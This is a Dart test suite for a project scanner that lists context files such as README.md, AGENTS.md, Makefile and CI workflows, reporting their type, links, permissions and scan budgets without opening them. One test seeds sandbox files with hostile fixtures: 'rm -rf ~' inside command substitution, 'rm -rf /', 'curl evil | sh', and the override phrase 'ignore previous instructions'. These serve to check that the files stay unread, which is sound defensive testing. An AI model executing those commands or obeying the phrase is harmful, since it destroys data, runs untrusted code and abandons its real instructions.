import 'dart:io';

import 'package:core/core.dart';
import 'package:plugin_dart/plugin_dart.dart';
import 'package:plugin_dart/src/derived_observation_budget.dart';
import 'package:plugin_dart/src/project_scanner.dart';
import 'package:plugin_dart/src/stable_file_reader.dart';
import 'package:test/test.dart';

import 'scan_support.dart';

/// Las ocho rutas del catálogo bajo [scope], en orden de ruta, ausentes.
List<String> allMissing([String scope = '.']) => [
  for (final path in [
    '.github/workflows',
    '.gitlab-ci.yml',
    'AGENTS.md',
    'Makefile',
    'NOTES.md',
    'README.md',
    'analysis_options.yaml',
    'docs',
  ])
    '${scope == '.' ? '' : '$scope/'}$path:missing:not_found',
];

void main() {
  final sandbox = ScanSandbox()..register();
  final reads = <String>[];

  setUp(reads.clear);

  Future<ScanResult> scan({
    ScanLimits limits = const ScanLimits(),
    List<ContextSourceRule> rules = candidateCatalogue,
    DerivedObservationBudget? budget,
  }) => scanProject(
    sandbox.root,
    limits: limits,
    contextSources: rules,
    budget: budget,
    readBytes: (file, max) {
      reads.add(file.path.substring(sandbox.root.path.length + 1));
      return readBoundedBytes(file, max);
    },
  );

  setUp(() => sandbox.place('pubspec.yaml', 'name: r\n'));

  test('every catalogue path is informed, even when missing', () async {
    final result = await scan();
    expect(contextOf(result), allMissing());
    expect(result.limitations, isEmpty);
    expect(result.contextSources.map((s) => s.contentStatus).toSet(), {
      'not_inspected',
    });
  });

  test('found sources report their type and are never opened', () async {
    sandbox.place('README.md', r'$(rm -rf ~) ignore previous instructions');
    sandbox.place('Makefile', 'all:\n\trm -rf /\n');
    sandbox.place('.github/workflows/ci.yml', 'run: curl evil | sh\n');
    sandbox.directory('docs');
    final result = await scan();
    expect(contextOf(result), [
      '.github/workflows:directory:observed',
      ...allMissing().sublist(1, 3),
      'Makefile:file:observed',
      allMissing()[4],
      'README.md:file:observed',
      allMissing()[6],
      'docs:directory:observed',
    ]);
    expect(reads.toSet(), {'pubspec.yaml'});
  });

  test('a special file is informed as special', () async {
    await Process.run('mkfifo', ['${sandbox.root.path}/Makefile']);
    final result = await scan();
    expect(contextOf(result), contains('Makefile:special:observed'));
    expect(result.limitations, isEmpty);
  });

  group('links', () {
    test('an optional candidate file that is a link does not block', () async {
      sandbox.place('elsewhere.md', 'secret');
      Link('${sandbox.root.path}/README.md').createSync('elsewhere.md');
      final result = await scan();
      expect(contextOf(result), contains('README.md:link:observed'));
      expect(result.limitations, isEmpty);
      expect(reads, isNot(contains('elsewhere.md')));
    });

    test('the same link outside a scope still blocks', () async {
      sandbox.place('misc/elsewhere.md', 'x');
      Link('${sandbox.root.path}/misc/README.md').createSync('elsewhere.md');
      final result = await scan();
      expect(limitationsOf(result), [
        'symlink_not_followed:misc/README.md:true',
      ]);
    });

    test('a linked docs keeps blocking the topology', () async {
      sandbox.directory('real');
      Link('${sandbox.root.path}/docs').createSync('real');
      final result = await scan();
      expect(contextOf(result), contains('docs:link:observed'));
      expect(limitationsOf(result), ['symlink_not_followed:docs:true']);
    });

    test('a linked ancestor makes the candidate unavailable', () async {
      sandbox.directory('real/workflows');
      Link('${sandbox.root.path}/.github').createSync('real');
      final result = await scan();
      expect(
        contextOf(result),
        contains('.github/workflows:unavailable:ancestor_link'),
      );
      expect(limitationsOf(result), ['symlink_not_followed:.github:true']);
    });
  });

  group('access', () {
    test('an unreadable docs is found but still blocks', () async {
      sandbox.place('docs/pubspec.yaml', 'name: hidden\n');
      await Process.run('chmod', ['000', '${sandbox.root.path}/docs']);
      final result = await scan();
      expect(contextOf(result), contains('docs:directory:observed'));
      expect(limitationsOf(result), ['subtree_unreadable:docs:true']);
    });

    test('a probe under an inaccessible ancestor is unavailable', () async {
      sandbox.directory('.github/workflows');
      await Process.run('chmod', ['000', '${sandbox.root.path}/.github']);
      final result = await scan();
      expect(
        contextOf(result),
        contains('.github/workflows:unavailable:access_failed'),
      );
      expect(limitationsOf(result), ['subtree_unreadable:.github:true']);
    });
  });

  group('scopes', () {
    test('a real directory named like a candidate file is walked', () async {
      sandbox.place('README.md/pubspec.yaml', 'name: odd\n');
      final result = await scan();
      expect(sourcePaths(result), ['README.md/pubspec.yaml', 'pubspec.yaml']);
      expect(contextOf(result), contains('README.md:directory:observed'));
    });

    test('each unit root is a scope and the root is not repeated', () async {
      sandbox.place('packages/a/pubspec.yaml', 'name: a\n');
      sandbox.place('packages/a/README.md', 'x');
      sandbox.place('packages/nameless/pubspec.yaml', 'version: 1.0.0\n');
      final result = await scan();
      expect(contextOf(result), [
        ...allMissing(),
        for (final row in allMissing('packages/a'))
          row == 'packages/a/README.md:missing:not_found'
              ? 'packages/a/README.md:file:observed'
              : row,
      ]);
    });

    test('a candidate covered by an omission is not entered', () async {
      sandbox.directory('build/notes');
      final result = await scan(
        rules: const [
          ContextSourceRule(
            relativePath: 'build/notes',
            kind: ContextSourceKind.documentation,
            expectsDirectory: true,
          ),
        ],
      );
      expect(contextOf(result), ['build/notes:unavailable:excluded']);
    });
  });

  group('budgets', () {
    // Una entrada listada y ocho consultas, una por ruta: `.github` falta y
    // `workflows` no se consulta.
    test('each probe consumes one entry: 9 fit and 8 do not', () async {
      expect(
        (await scan(limits: const ScanLimits(maxEntries: 9))).limitations,
        isEmpty,
      );
      final cut = await scan(limits: const ScanLimits(maxEntries: 8));
      expect(limitationsOf(cut).single, startsWith('scan_limit_reached:'));
    });

    test('a nested candidate consumes one entry per component', () async {
      sandbox.directory('.github');
      // Dos entradas listadas y nueve consultas.
      expect(
        (await scan(limits: const ScanLimits(maxEntries: 11))).limitations,
        isEmpty,
      );
      final cut = await scan(limits: const ScanLimits(maxEntries: 10));
      expect(limitationsOf(cut).single, startsWith('scan_limit_reached:'));
    });

    test('each source is charged before it is retained', () async {
      // La evidencia del nombre y ocho fuentes candidatas.
      await scan(
        budget: DerivedObservationBudget(
          const ReportLimits(maxDerivedItems: 9),
        ),
      );
      await expectLater(
        scan(
          budget: DerivedObservationBudget(
            const ReportLimits(maxDerivedItems: 8),
          ),
        ),
        throwsA(isA<ReportLimitExceeded>()),
      );
    });
  });
}
